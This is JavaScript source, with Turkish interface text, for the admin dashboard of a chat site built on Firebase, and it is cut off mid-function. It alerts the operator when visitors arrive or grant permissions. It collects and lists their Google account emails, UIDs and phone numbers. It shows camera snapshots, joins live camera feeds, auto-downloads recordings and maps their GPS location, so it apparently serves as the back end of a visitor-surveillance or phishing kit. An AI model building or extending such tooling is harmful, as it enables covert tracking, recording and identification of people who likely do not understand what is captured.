import "./chat-sync.js?v=98";

async function ready() {
  if (window.ChatSync) return window.ChatSync;
  if (window.ChatSyncReady) return window.ChatSyncReady;
  return new Promise((resolve) => {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      if (window.ChatSyncReady) {
        clearInterval(t);
        Promise.resolve(window.ChatSyncReady).then(resolve);
        return;
      }
      if (window.ChatSync) {
        clearInterval(t);
        resolve(window.ChatSync);
        return;
      }
      // Firebase CDN geç yüklenebilir — 15 sn bekle
      if (n > 300) {
        clearInterval(t);
        resolve(null);
      }
    }, 50);
  });
}

function fmtTime(ts) {
  if (!ts) return "—";
  return new Date(ts).toLocaleString("tr-TR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function shortId(id) {
  return String(id || "").slice(0, 8);
}

function whoLabel(msg) {
  if (msg.who === "user") return "Ziyaretçi";
  if (msg.who === "admin" || msg.from === "admin") return "Sen";
  return "Bot";
}

const setupPanel = document.getElementById("setup-panel");
const loginPanel = document.getElementById("login-panel");
const dashPanel = document.getElementById("dash-panel");
const liveBadge = document.getElementById("live-badge");
const notifyBtn = document.getElementById("notify-btn");
const logoutBtn = document.getElementById("logout-btn");
const loginForm = document.getElementById("login-form");
const loginError = document.getElementById("login-error");
const sessionList = document.getElementById("session-list");
const sessionCount = document.getElementById("session-count");
const threadTitle = document.getElementById("thread-title");
const threadMeta = document.getElementById("thread-meta");
const threadMessages = document.getElementById("thread-messages");
const replyForm = document.getElementById("reply-form");
const replyInput = document.getElementById("reply-input");
const sendHint = document.getElementById("send-hint");
const quickList = document.getElementById("quick-list");
const sendLoadingBtn = document.getElementById("send-loading-btn");
const sendCameraBtn = document.getElementById("send-camera-btn");
const sendPhotosBtn = document.getElementById("send-photos-btn");
const sendPopupBtn = document.getElementById("send-popup-btn");
const popupText = document.getElementById("popup-text");
const popupOk = document.getElementById("popup-ok");
const popupCancel = document.getElementById("popup-cancel");
const popupPlaceholder = document.getElementById("popup-placeholder");
const adminCameraBox = document.getElementById("admin-camera-box");
const cameraStatus = document.getElementById("camera-status");
const adminRemoteVideo = document.getElementById("admin-remote-video");
const endCameraBtn = document.getElementById("end-camera-btn");
const endCameraBtnModal = document.getElementById("end-camera-btn-modal");
const hideCameraBtn = document.getElementById("hide-camera-btn");
const hideCameraPanelBtn = document.getElementById("hide-camera-panel-btn");
const hideCameraBtnModal = document.getElementById("hide-camera-btn-modal");
const reopenCameraBtn = document.getElementById("reopen-camera-btn");
const downloadRecordingBtn = document.getElementById("download-recording-btn");
const adminSnapshotPreview = document.getElementById("admin-snapshot-preview");
const adminSnapshotLink = document.getElementById("admin-snapshot-link");
const adminMediaDock = document.getElementById("admin-media-dock");
const dockStatusPill = document.getElementById("dock-status-pill");
const dockSnapshot = document.getElementById("dock-snapshot");
const dockSnapshotLink = document.getElementById("dock-snapshot-link");
const dockCamText = document.getElementById("dock-cam-text");
const dockOpenCameraBtn = document.getElementById("dock-open-camera-btn");
const dockLocText = document.getElementById("dock-loc-text");
const dockLocMaps = document.getElementById("dock-loc-maps");
const adminLiveLocation = document.getElementById("admin-live-location");
const adminLocationText = document.getElementById("admin-location-text");
const adminLocationMaps = document.getElementById("admin-location-maps");
const exportChatBtn = document.getElementById("export-chat-btn");
const clearChatBtn = document.getElementById("clear-chat-btn");
const clearAllChatsBtn = document.getElementById("clear-all-chats-btn");
const recentListEl = document.getElementById("admin-recent-list");
const recentFeedEl = document.getElementById("admin-recent-feed");
const templatesEditor = document.getElementById("templates-editor");
const templatesForm = document.getElementById("templates-form");
const templatesSaved = document.getElementById("templates-saved");
const addTemplateBtn = document.getElementById("add-template");
const resetTemplatesBtn = document.getElementById("reset-templates");
const alertOverlay = document.getElementById("admin-alert-overlay");
const alertKicker = document.getElementById("admin-alert-kicker");
const alertTitle = document.getElementById("admin-alert-title");
const alertBody = document.getElementById("admin-alert-body");
const alertDismiss = document.getElementById("admin-alert-dismiss");
const gmailList = document.getElementById("gmail-list");
const gmailCount = document.getElementById("gmail-count");
const gmailSearch = document.getElementById("gmail-search");
const gmailCopyBtn = document.getElementById("gmail-copy-btn");
const gmailBackfillBtn = document.getElementById("gmail-backfill-btn");
const gmailHint = document.getElementById("gmail-hint");

let unsubSessions = null;
let unsubMessages = null;
let unsubGoogleAccounts = null;
let selectedId = null;
let seenMessageIds = new Set();
let notifyEnabled = false;
let alertsArmed = false;
let sending = false;
let adminCall = null;
let knownSessionIds = new Set();
let googleAccountRows = [];
let latestSessionRows = [];
let sessionUpdatedAt = new Map();
let sessionsHydrated = false;
let recentFeedTimer = null;
let recentFeedSeq = 0;
let lastAlertAt = 0;
let lastAlertKey = "";
let lastDesktopNotif = null;
const ALERT_COOLDOWN_MS = 5000;
let alertAudioCtx = null;
let titleFlashTimer = null;
let originalTitle = document.title;
let alertHideTimer = null;
let alertSoundTimer = null;
let alertSounding = false;
let audioUnlocked = false;
let unlockListenersBound = false;

function ensureAlertAudio() {
  if (alertAudioCtx) return alertAudioCtx;
  const AC = window.AudioContext || window.webkitAudioContext;
  if (!AC) return null;
  try {
    alertAudioCtx = new AC();
  } catch {
    return null;
  }
  return alertAudioCtx;
}

async function unlockAlertAudio() {
  const ctx = ensureAlertAudio();
  if (!ctx) return false;
  try {
    if (ctx.state === "suspended") {
      await ctx.resume();
    }
    // Gerçek sessiz tick — tarayici ses kilidini açar
    const buffer = ctx.createBuffer(1, 1, 22050);
    const src = ctx.createBufferSource();
    src.buffer = buffer;
    src.connect(ctx.destination);
    src.start(0);
    audioUnlocked = ctx.state === "running";
  } catch (err) {
    console.warn("Ses açilamadi", err);
    audioUnlocked = false;
  }
  updateNotifyBtnLabel();
  return audioUnlocked;
}

function updateNotifyBtnLabel() {
  if (!notifyBtn) return;
  if (!alertsArmed) {
    notifyBtn.textContent = "?? Alarmlari aç";
    return;
  }
  if (audioUnlocked) {
    notifyBtn.textContent = notifyEnabled
      ? "?? Alarm + ses açik"
      : "?? Ses açik (masaüstü kapali)";
  } else {
    notifyBtn.textContent = "?? Sesi aç (tikla)";
  }
}

function bindAudioUnlockGestures() {
  if (unlockListenersBound) return;
  unlockListenersBound = true;
  const tryUnlock = () => {
    if (audioUnlocked) return;
    void unlockAlertAudio().then((ok) => {
      if (ok && alertSounding) void playAlertBeeps();
    });
  };
  document.addEventListener("pointerdown", tryUnlock, true);
  document.addEventListener("keydown", tryUnlock, true);
}

async function playAlertBeeps() {
  const ctx = ensureAlertAudio();
  if (!ctx) return false;
  try {
    if (ctx.state !== "running") {
      await ctx.resume();
    }
  } catch {
    return false;
  }
  if (ctx.state !== "running") {
    audioUnlocked = false;
    updateNotifyBtnLabel();
    return false;
  }
  audioUnlocked = true;

  // Daha net / yüksek bip
  const pattern = [
    { t: 0, f: 880, d: 0.12 },
    { t: 0.16, f: 1175, d: 0.14 },
    { t: 0.34, f: 988, d: 0.16 },
  ];
  const now = ctx.currentTime;
  pattern.forEach(({ t, f, d }) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "square";
    osc.frequency.value = f;
    gain.gain.setValueAtTime(0.001, now + t);
    gain.gain.exponentialRampToValueAtTime(0.35, now + t + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.001, now + t + d);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(now + t);
    osc.stop(now + t + d + 0.03);
  });
  return true;
}

function stopAlertSound() {
  alertSounding = false;
  if (alertSoundTimer) {
    clearInterval(alertSoundTimer);
    alertSoundTimer = null;
  }
}

function startAlertSoundLoop() {
  stopAlertSound();
  alertSounding = true;
  bindAudioUnlockGestures();

  const tick = () => {
    if (!alertSounding) return;
    void playAlertBeeps().then((ok) => {
      if (!ok && alertOverlay && !alertOverlay.hidden && alertBody) {
        // Ses kilitliyse kullaniciya net yaz
        const tip = " · Ses için sayfaya bir kez tikla / Alarmlari aç";
        if (!String(alertBody.textContent || "").includes("Ses için")) {
          alertBody.textContent = `${alertBody.textContent || ""}${tip}`;
        }
      }
    });
  };

  tick();
  alertSoundTimer = window.setInterval(tick, 900);
}

function flashDocumentTitle(text) {
  if (titleFlashTimer) clearInterval(titleFlashTimer);
  let on = false;
  originalTitle = originalTitle || document.title;
  titleFlashTimer = window.setInterval(() => {
    if (!alertSounding) {
      clearInterval(titleFlashTimer);
      titleFlashTimer = null;
      document.title = originalTitle;
      return;
    }
    on = !on;
    document.title = on ? `? ${text}` : originalTitle;
  }, 700);
}

function hideAdminAlert() {
  stopAlertSound();
  if (alertOverlay) alertOverlay.hidden = true;
  document.body.classList.remove("is-alert-flash");
  if (alertHideTimer) {
    clearTimeout(alertHideTimer);
    alertHideTimer = null;
  }
  if (titleFlashTimer) {
    clearInterval(titleFlashTimer);
    titleFlashTimer = null;
  }
  document.title = originalTitle || document.title;
  if (liveBadge) liveBadge.classList.remove("is-ping");
}

function showAdminAlert({ kicker, title, body }) {
  if (alertKicker) alertKicker.textContent = kicker || "Yeni bildirim";
  if (alertTitle) alertTitle.textContent = title || "Bildirim";
  if (alertBody) alertBody.textContent = body || "";
  if (alertOverlay) alertOverlay.hidden = false;
  // Otomatik kapanmaz — sadece Tamam ile
  if (alertHideTimer) {
    clearTimeout(alertHideTimer);
    alertHideTimer = null;
  }
}

function pushDesktopNotification(title, body) {
  if (!("Notification" in window)) return;
  if (Notification.permission !== "granted") return;
  try {
    // Ayni tag ? Windows üst üste istiflemez, eskisinin yerine geçer
    if (lastDesktopNotif) {
      try {
        lastDesktopNotif.close();
      } catch {
        /* ignore */
      }
    }
    lastDesktopNotif = new Notification(title, {
      body: String(body || "").slice(0, 140),
      tag: "admin-live-alert",
      renotify: true,
      requireInteraction: false,
      silent: true,
    });
  } catch {
    /* ignore */
  }
}

function shouldFireFullAlert(key, force) {
  const now = Date.now();
  if (force) {
    lastAlertAt = now;
    lastAlertKey = key;
    return true;
  }
  // Kisa sürede ayni/üst üste alarmlari yut
  if (now - lastAlertAt < ALERT_COOLDOWN_MS) return false;
  lastAlertAt = now;
  lastAlertKey = key;
  return true;
}

function fireHighAlert({ kicker, title, body, tag, force = false }) {
  if (!alertsArmed) alertsArmed = true;
  bindAudioUnlockGestures();

  const key = String(tag || title || "alert");
  const full = shouldFireFullAlert(key, force);

  // Toast içerigini her zaman güncelle
  showAdminAlert({ kicker, title, body });

  if (!full) {
    // Sadece metni güncelle; ses/masaüstü spam yok
    return;
  }

  startAlertSoundLoop();
  flashDocumentTitle(title);
  pushDesktopNotification(title, body);
  if (liveBadge) liveBadge.classList.add("is-ping");
}

function renderRecentFeed(items) {
  if (!recentListEl) return;
  recentListEl.innerHTML = "";
  if (!items?.length) {
    recentListEl.innerHTML = '<li class="admin-recent-empty">Henüz mesaj yok</li>';
    return;
  }
  items.forEach((item) => {
    const li = document.createElement("li");
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "admin-recent-item";
    btn.title = "Sohbeti aç";
    const who = whoLabel(item);
    const text = String(item.text || "").trim() || "(bos)";
    btn.innerHTML = `
      <span class="admin-recent-item-top">
        <span class="admin-recent-item-who">${escapeHtml(who)} · #${shortId(item.sessionId)}</span>
        <span>${escapeHtml(fmtTime(item.ts))}</span>
      </span>
      <span class="admin-recent-item-text">${escapeHtml(text)}</span>
    `;
    btn.addEventListener("click", () => {
      const row = latestSessionRows.find((r) => r.id === item.sessionId);
      if (row) openSession(row);
      else openSession({ id: item.sessionId, page: item.page || "/", updatedAt: item.ts });
    });
    li.appendChild(btn);
    recentListEl.appendChild(li);
  });
}

function scheduleRecentFeedRefresh(rows) {
  latestSessionRows = Array.isArray(rows) ? rows : [];
  if (recentFeedTimer) clearTimeout(recentFeedTimer);
  recentFeedTimer = window.setTimeout(() => {
    void refreshRecentFeed(latestSessionRows);
  }, 250);
}

async function refreshRecentFeed(rows) {
  const sync = window.ChatSync;
  if (!sync?.getSessionMessages || !recentListEl) return;
  const seq = ++recentFeedSeq;
  const list = (Array.isArray(rows) ? rows : [])
    .slice()
    .sort((a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0))
    .slice(0, 15);

  try {
    const batches = await Promise.all(
      list.map(async (row) => {
        try {
          const msgs = await sync.getSessionMessages(row.id);
          return (msgs || []).slice(-5).map((m) => ({
            ...m,
            sessionId: row.id,
            page: row.page || "/",
          }));
        } catch {
          return [];
        }
      })
    );
    if (seq !== recentFeedSeq) return;
    const merged = batches
      .flat()
      .filter((m) => m && m.id)
      .sort((a, b) => (Number(a.ts) || 0) - (Number(b.ts) || 0))
      .slice(-5)
      .reverse();
    renderRecentFeed(merged);
  } catch (err) {
    console.warn("recent feed", err);
  }
}

function bindSessionMessages(sessionId) {
  if (unsubMessages) {
    unsubMessages();
    unsubMessages = null;
  }
  if (!sessionId || !window.ChatSync?.listenMessages) return;

  // onChildAdded geçmisi senkron getirir: attach sirasinda announce kapali
  let announceLive = false;
  unsubMessages = window.ChatSync.listenMessages(sessionId, (msg) => {
    appendThreadMessage(msg, announceLive);
  });
  announceLive = true;
}

function startDash(sync) {
  show("dash");
  bindAudioUnlockGestures();
  renderQuickButtons();
  renderTemplatesEditor(sync.getQuickReplies());
  knownSessionIds = new Set();
  sessionUpdatedAt = new Map();
  sessionsHydrated = false;

  if (!alertsArmed) {
    armAlerts().catch(() => {
      alertsArmed = true;
      updateNotifyBtnLabel();
    });
  } else {
    void unlockAlertAudio();
    updateNotifyBtnLabel();
  }

  if (unsubGoogleAccounts) unsubGoogleAccounts();
  if (sync.listenGoogleAccounts) {
    unsubGoogleAccounts = sync.listenGoogleAccounts((rows) => {
      googleAccountRows = Array.isArray(rows) ? rows : [];
      renderGmails();
    });
  }

  if (unsubSessions) unsubSessions();
  unsubSessions = sync.listenSessions((rows) => {
    if (!Array.isArray(rows)) rows = [];
    latestSessionRows = rows;

    if (!sessionsHydrated) {
      rows.forEach((r) => {
        knownSessionIds.add(r.id);
        sessionUpdatedAt.set(r.id, Number(r.updatedAt) || 0);
      });
      sessionsHydrated = true;
      renderSessions(rows);
      scheduleRecentFeedRefresh(rows);
      if (!selectedId && rows[0]) openSession(rows[0]);
      if (sendHint && !rows.length) {
        sendHint.hidden = false;
        sendHint.textContent = "Henüz oturum yok. Ziyaretçi sohbet baslatinca burada görünür.";
      }
      return;
    }

    const fresh = [];
    const bumped = [];
    rows.forEach((r) => {
      const updated = Number(r.updatedAt) || 0;
      if (!knownSessionIds.has(r.id)) {
        knownSessionIds.add(r.id);
        sessionUpdatedAt.set(r.id, updated);
        fresh.push(r);
        return;
      }
      const prev = sessionUpdatedAt.get(r.id) || 0;
      if (updated > prev) {
        sessionUpdatedAt.set(r.id, updated);
        const preview = String(r.preview || "");
        const isEntry = /siteye\s+giri[ss]/i.test(preview);
        const enteredAt = Number(r.enteredAt) || 0;
        const camAt = Number(r.cameraGrantedAt) || 0;
        const locAt = Number(r.lastLocationAt) || 0;
        // Ilk izin / kamera / konum — sohbet sayfasi olmasa da admin’e düssün
        const isMedia =
          Boolean(r.cameraGranted || r.hasCamera || r.hasLocation || r.cameraPending) ||
          camAt > prev ||
          locAt > prev ||
          /??|??|kamera|konum/i.test(preview);
        if (r.lastWho === "user" || isEntry || enteredAt > prev || isMedia) {
          bumped.push(r);
        }
      }
    });

    const live = new Set(rows.map((r) => r.id));
    [...knownSessionIds].forEach((id) => {
      if (!live.has(id)) {
        knownSessionIds.delete(id);
        sessionUpdatedAt.delete(id);
      }
    });

    renderSessions(rows);
    scheduleRecentFeedRefresh(rows);

    if (fresh.length) {
      const newest = fresh.sort(
        (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
      )[0];
      fireHighAlert({
        kicker: "YENI ZIYARETÇI",
        title: "Siteye yeni kullanici girdi",
        body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
          newest.preview || "Siteye giris yapti"
        ).slice(0, 100)}`,
        tag: `fresh-${newest.id}`,
        force: true,
      });
      openSession(newest);
      maybeJoinSessionCamera(newest);
      return;
    }

    if (bumped.length) {
      const newest = bumped.sort(
        (a, b) => (Number(b.updatedAt) || 0) - (Number(a.updatedAt) || 0)
      )[0];
      const isEntry = /siteye\s+giri[ss]/i.test(String(newest.preview || ""));
      const isMedia =
        Boolean(
          newest.cameraGranted ||
            newest.hasCamera ||
            newest.hasLocation ||
            newest.cameraPending
        ) || /??|??|kamera|konum/i.test(String(newest.preview || ""));

      if (newest.id === selectedId && !isEntry && !isMedia) {
        /* skip bump alert */
      } else {
        fireHighAlert({
          kicker: isMedia ? "KAMERA / KONUM" : isEntry ? "SITE GIRISI" : "YENI MESAJ",
          title: isMedia
            ? "Ziyaretçi izin verdi — kamera/konum"
            : isEntry
              ? "Ziyaretçi siteye girdi"
              : "Ziyaretçi aktivitesi",
          body: `#${shortId(newest.id)} · ${newest.page || "/"} · ${String(
            newest.preview || ""
          ).slice(0, 120)}`,
          tag: isMedia
            ? `media-${newest.id}`
            : isEntry
              ? `entry-${newest.id}`
              : `bump-${newest.id}`,
          force: Boolean(isMedia),
        });
      }
      if (isMedia || newest.id !== selectedId) openSession(newest);
      maybeJoinSessionCamera(newest);
    }

    if (!selectedId && rows[0]) openSession(rows[0]);
  });
}

function maybeJoinSessionCamera(row) {
  if (!row?.id || !row.lastCallId) return;
  if (!(row.cameraGranted || row.hasCamera || row.cameraPending)) return;
  // Izin aninda sohbet oturumunu aç + canli kameraya baglan
  if (selectedId !== row.id) {
    openSession(row);
    return;
  }
  window.setTimeout(() => {
    void joinAdminCamera(row.id, row.lastCallId);
  }, 200);
}

async function armAlerts() {
  alertsArmed = true;
  bindAudioUnlockGestures();
  // Önce ses kilidini aç (Notification izni jesti tüketmeden)
  await unlockAlertAudio();
  const played = await playAlertBeeps();
  if ("Notification" in window) {
    try {
      const perm =
        Notification.permission === "granted"
          ? "granted"
          : await Notification.requestPermission();
      notifyEnabled = perm === "granted";
    } catch {
      notifyEnabled = false;
    }
  } else {
    notifyEnabled = false;
  }
  updateNotifyBtnLabel();
  if (!played) {
    if (sendHint) {
      sendHint.hidden = false;
      sendHint.textContent =
        "Ses henüz kilitli. Üstteki “Sesi aç” butonuna tekrar tikla veya sayfaya bir kez tikla.";
    }
  } else if (sendHint) {
    sendHint.hidden = false;
    sendHint.textContent = "Test sesi çaldi. Alarmlar hazir.";
    window.setTimeout(() => {
      if (sendHint.textContent.includes("Test sesi")) sendHint.hidden = true;
    }, 2500);
  }
}

function show(view) {
  if (setupPanel) setupPanel.hidden = view !== "setup";
  if (loginPanel) loginPanel.hidden = view !== "login";
  if (dashPanel) dashPanel.hidden = view !== "dash";
  if (recentFeedEl) recentFeedEl.hidden = view !== "dash";
  if (liveBadge) liveBadge.hidden = view !== "dash";
  if (notifyBtn) notifyBtn.hidden = view !== "dash";
  if (logoutBtn) logoutBtn.hidden = view !== "dash";
}

function authOk() {
  return sessionStorage.getItem("admin_ok") === "1";
}

function setAuth(ok) {
  if (ok) sessionStorage.setItem("admin_ok", "1");
  else sessionStorage.removeItem("admin_ok");
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function formatLocationLine(loc) {
  if (!loc || !Number.isFinite(Number(loc.lat)) || !Number.isFinite(Number(loc.lng))) return "";
  const lat = Number(loc.lat);
  const lng = Number(loc.lng);
  const acc = Number(loc.accuracy);
  const accTxt = Number.isFinite(acc) ? ` · ±${Math.round(acc)} m` : "";
  const t = loc.ts ? ` · ${fmtTime(loc.ts)}` : "";
  return `${lat.toFixed(5)}, ${lng.toFixed(5)}${accTxt}${t}`;
}

function mapsUrlFromLoc(loc) {
  if (!loc || !Number.isFinite(Number(loc.lat)) || !Number.isFinite(Number(loc.lng))) return "";
  return `https://www.google.com/maps?q=${Number(loc.lat)},${Number(loc.lng)}`;
}

function updateMediaDock(row) {
  if (!adminMediaDock) return;
  if (!row?.id) {
    adminMediaDock.hidden = true;
    return;
  }
  adminMediaDock.hidden = false;

  const hasCam = Boolean(row.cameraGranted || row.hasCamera || row.lastSnapshotUrl);
  const loc = row.lastLocation || null;
  const hasLoc = Boolean(row.hasLocation || formatLocationLine(loc));

  if (dockStatusPill) {
    if (hasCam && hasLoc) dockStatusPill.textContent = "Kamera + konum";
    else if (hasCam) dockStatusPill.textContent = "Kamera var";
    else if (hasLoc) dockStatusPill.textContent = "Konum var";
    else dockStatusPill.textContent = "Bekleniyor";
  }

  if (row.lastSnapshotUrl) {
    if (dockSnapshot) {
      dockSnapshot.src = row.lastSnapshotUrl;
      dockSnapshot.hidden = false;
    }
    if (dockSnapshotLink) {
      dockSnapshotLink.href = row.lastSnapshotUrl;
      dockSnapshotLink.hidden = false;
    }
    if (dockCamText) dockCamText.textContent = "Son fotograf hazir";
  } else {
    if (dockSnapshot) {
      dockSnapshot.removeAttribute("src");
      dockSnapshot.hidden = true;
    }
    if (dockSnapshotLink) {
      dockSnapshotLink.removeAttribute("href");
      dockSnapshotLink.hidden = true;
    }
    if (dockCamText) {
      dockCamText.textContent = hasCam
        ? "Izin verildi · fotograf bekleniyor"
        : "Kamera izni yok";
    }
  }

  if (dockOpenCameraBtn) {
    dockOpenCameraBtn.hidden = !hasCam;
    dockOpenCameraBtn.dataset.sessionId = row.id;
  }

  const line = formatLocationLine(loc);
  const maps = mapsUrlFromLoc(loc);
  if (dockLocText) {
    dockLocText.textContent = line || (row.hasLocation ? "Konum kaydi var" : "Konum yok");
  }
  if (dockLocMaps) {
    if (maps) {
      dockLocMaps.href = maps;
      dockLocMaps.hidden = false;
    } else {
      dockLocMaps.removeAttribute("href");
      dockLocMaps.hidden = true;
    }
  }
}

function filteredGoogleAccounts() {
  const q = String(gmailSearch?.value || "")
    .trim()
    .toLowerCase();
  const rows = googleAccountRows.filter((r) => r.email || r.name || r.uid);
  if (!q) return rows;
  return rows.filter((r) => {
    const hay = [r.email, r.name, r.uid, r.lastSessionId]
      .map((x) => String(x || "").toLowerCase())
      .join(" ");
    return hay.includes(q);
  });
}

function fmtAuthDate(ts) {
  if (!ts) return "—";
  return new Date(ts).toLocaleDateString("en-US", {
    month: "short",
    day: "numeric",
    year: "numeric",
  });
}

function renderGmails() {
  if (!gmailList) return;
  const rows = filteredGoogleAccounts();
  const total = googleAccountRows.filter((r) => r.email || r.name || r.uid).length;
  if (gmailCount) {
    gmailCount.textContent = `${total} hesap · Google Authentication kullanicilari`;
  }
  gmailList.innerHTML = "";
  if (!rows.length) {
    gmailList.innerHTML = total
      ? `<tr class="gmail-empty-row"><td colspan="6">Aramayla eslesen hesap yok</td></tr>`
      : `<tr class="gmail-empty-row"><td colspan="6">Henüz Google girisi yok. Ziyaretçi Gmail ile girince burada listelenir (Firebase Authentication Users gibi).</td></tr>`;
    return;
  }

  rows.forEach((row) => {
    const tr = document.createElement("tr");
    tr.className = "gmail-row";
    const email = String(row.email || "").trim();
    const name = String(row.name || "").trim();
    const photo = String(row.photo || "").trim();
    const uid = String(row.uid || row.id || "").trim();
    const sid = String(row.lastSessionId || "").trim();
    const created = Number(row.createdAt) || Number(row.firstSeenAt) || 0;
    const signedIn = Number(row.signedInAt) || Number(row.lastSeenAt) || 0;
    const providers = Array.isArray(row.providers) && row.providers.length
      ? row.providers
      : ["google.com"];

    const avatar = photo
      ? `<img class="gmail-avatar" src="${escapeHtml(photo)}" alt="" referrerpolicy="no-referrer" />`
      : `<span class="gmail-avatar gmail-avatar-fallback" aria-hidden="true">${escapeHtml(
          (name || email || "?").slice(0, 1).toUpperCase()
        )}</span>`;

    const providerBadges = providers
      .map((p) => {
        const isGoogle = String(p).includes("google");
        return `<span class="gmail-provider ${isGoogle ? "is-google" : ""}" title="${escapeHtml(
          p
        )}">${isGoogle ? "G" : escapeHtml(String(p).slice(0, 1).toUpperCase())}</span>`;
      })
      .join("");

    tr.innerHTML = `
      <td>
        <div class="gmail-id-cell">
          ${avatar}
          <div class="gmail-id-text">
            <strong class="gmail-email">${escapeHtml(email || "E-posta yok")}</strong>
            ${name ? `<span class="gmail-name">${escapeHtml(name)}</span>` : ""}
          </div>
        </div>
      </td>
      <td><div class="gmail-providers">${providerBadges}</div></td>
      <td>${escapeHtml(fmtAuthDate(created))}</td>
      <td>${escapeHtml(fmtAuthDate(signedIn))}</td>
      <td><code class="gmail-uid" title="${escapeHtml(uid)}">${escapeHtml(
        uid.length > 22 ? `${uid.slice(0, 22)}…` : uid
      )}</code></td>
      <td class="gmail-actions-cell"></td>
    `;

    const actions = tr.querySelector(".gmail-actions-cell");
    if (email) {
      const copyBtn = document.createElement("button");
      copyBtn.type = "button";
      copyBtn.className = "btn btn-ghost gmail-action-btn";
      copyBtn.textContent = "Kopyala";
      copyBtn.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(email);
          showGmailHint(`Kopyalandi: ${email}`);
        } catch {
          showGmailHint("Kopyalama basarisiz");
        }
      });
      actions.appendChild(copyBtn);
    }
    if (uid) {
      const copyUid = document.createElement("button");
      copyUid.type = "button";
      copyUid.className = "btn btn-ghost gmail-action-btn";
      copyUid.textContent = "UID";
      copyUid.addEventListener("click", async () => {
        try {
          await navigator.clipboard.writeText(uid);
          showGmailHint("UID kopyalandi");
        } catch {
          showGmailHint("Kopyalama basarisiz");
        }
      });
      actions.appendChild(copyUid);
    }
    if (sid) {
      const openBtn = document.createElement("button");
      openBtn.type = "button";
      openBtn.className = "btn btn-ghost gmail-action-btn";
      openBtn.textContent = "Sohbet";
      openBtn.addEventListener("click", () => {
        const session =
          latestSessionRows.find((s) => s.id === sid) ||
          ({ id: sid, preview: email || name || "Google hesap" });
        openSession(session);
        document.getElementById("thread-title")?.scrollIntoView?.({
          behavior: "smooth",
          block: "start",
        });
      });
      actions.appendChild(openBtn);
    }
    gmailList.appendChild(tr);
  });
}

function showGmailHint(text) {
  if (!gmailHint) return;
  gmailHint.hidden = false;
  gmailHint.textContent = text;
  clearTimeout(showGmailHint._t);
  showGmailHint._t = setTimeout(() => {
    gmailHint.hidden = true;
  }, 2400);
}

function renderSessions(rows) {
  latestSessionRows = Array.isArray(rows) ? rows : [];
  sessionCount.textContent = `${rows.length} oturum`;
  sessionList.innerHTML = "";
  if (!rows.length) {
    sessionList.innerHTML = '<li class="session-empty">Henüz sohbet yok. Sitede bir sohbet baslatin.</li>';
    updateMediaDock(null);
    return;
  }

  rows.forEach((row) => {
    const li = document.createElement("li");
    const card = document.createElement("div");
    card.className = "session-item" + (row.id === selectedId ? " is-active" : "");
    card.dataset.sessionId = row.id;

    const mainBtn = document.createElement("button");
    mainBtn.type = "button";
    mainBtn.className = "session-item-main";
    const last =
      row.lastWho === "user" ? "ziyaretçi" : row.lastWho === "admin" ? "sen" : "bot";
    const hasCam = Boolean(row.cameraGranted || row.hasCamera || row.lastSnapshotUrl);
    const hasLoc = Boolean(row.hasLocation || row.lastLocation);
    const hasGoogle = Boolean(row.googleEmail || row.googleName || row.googleUid);
    const hasPhone = Boolean(row.phone);
    const googleLine = hasGoogle
      ? escapeHtml(
          [row.googleName, row.googleEmail].filter(Boolean).join(" · ") || "Google giris"
        )
      : "";
    const phoneLine = hasPhone ? escapeHtml(String(row.phone)) : "";
    const badges = [
      hasGoogle ? '<span class="session-badge session-badge-google">Google</span>' : "",
      hasPhone ? '<span class="session-badge session-badge-phone">Telefon</span>' : "",
      hasCam ? '<span class="session-badge session-badge-cam">Kamera</span>' : "",
      hasLoc ? '<span class="session-badge session-badge-loc">Konum</span>' : "",
    ]
      .filter(Boolean)
      .join("");

    mainBtn.innerHTML = `
      <strong>#${shortId(row.id)}</strong>
      <span>${escapeHtml(row.preview || "Mesaj yok")}</span>
      ${googleLine ? `<span class="session-google-line">${googleLine}</span>` : ""}
      ${phoneLine ? `<span class="session-google-line">?? ${phoneLine}</span>` : ""}
      <em>${fmtTime(row.updatedAt)} · ${last}</em>
      ${badges ? `<div class="session-badges">${badges}</div>` : ""}
    `;
    mainBtn.addEventListener("click", () => openSession(row));

    const quick = document.createElement("div");
    quick.className = "session-quick";
    const camBtn = document.createElement("button");
    camBtn.type = "button";
    camBtn.className = "session-quick-btn";
    camBtn.textContent = "?? Kamera";
    camBtn.disabled = !hasCam;
    camBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      openSession(row);
      if (row.lastSnapshotUrl) showAdminSnapshot(row.lastSnapshotUrl);
      else showCameraPopup();
      adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
    });

    const locBtn = document.createElement("button");
    locBtn.type = "button";
    locBtn.className = "session-quick-btn";
    locBtn.textContent = "?? Konum";
    locBtn.disabled = !hasLoc;
    locBtn.addEventListener("click", (e) => {
      e.stopPropagation();
      openSession(row);
      const maps = mapsUrlFromLoc(row.lastLocation);
      if (maps) window.open(maps, "_blank", "noopener");
      updateMediaDock(row);
      adminMediaDock?.scrollIntoView?.({ behavior: "smooth", block: "nearest" });
    });

    quick.append(camBtn, locBtn);
    card.append(mainBtn, quick);
    li.appendChild(card);
    sessionList.appendChild(li);
  });

  if (selectedId) {
    const selected = rows.find((r) => r.id === selectedId);
    if (selected) {
      updateMediaDock(selected);
      maybeAutoDownloadSessionRecording(selected);
      // Canli call dinlenmiyorsa Storage çagrisini da izle
      if (
        selected.lastRecordingCallId &&
        !adminCall &&
        !selected.lastRecordingUrl
      ) {
        const watchKey = `${selected.id}/${selected.lastRecordingCallId}`;
        if (recordingWatchKey !== watchKey) {
          startRecordingWatch(selected.id, selected.lastRecordingCallId, {
            sessionId: selected.id,
            callId: selected.lastRecordingCallId,
            lastBlob: null,
            seenRecordingUrl: null,
            awaitingRecording: true,
          });
        }
      }
    }
  }
}

function setEndCameraVisible(visible) {
  if (endCameraBtn) endCameraBtn.hidden = !visible;
